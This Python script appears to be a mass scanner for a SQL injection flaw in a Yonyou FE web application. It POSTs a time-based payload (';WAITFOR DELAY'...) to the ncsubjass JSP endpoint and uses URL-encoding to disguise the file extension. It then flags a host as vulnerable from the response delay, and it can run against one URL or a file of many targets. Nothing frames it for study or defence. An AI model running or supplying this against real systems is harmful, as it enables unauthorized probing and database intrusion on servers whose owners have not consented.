import time

import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
import urllib.request
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = url + "/fenc/ncsubjass.j%73p"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data="subjcode=';WAITFOR DELAY '0:0:5'--".encode('utf')
    try:
        time_start = time.time()
        response = urllib.request.Request(target, headers=headers, data=data, method="POST", unverifiable=True)
        res = urllib.request.urlopen(response)
        status_code = res.getcode()
        content = res.read().decode('utf-8', errors='replace')
        time_end = time.time()-time_start
        if status_code == 200 and 'script' in content and 5 < time_end< 10:
            print(f"\033[31mDiscovered:{url}: YongYouFE_csubjass_SQLInject!\033[0m")
            return True
    except Exception as e:
        print(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")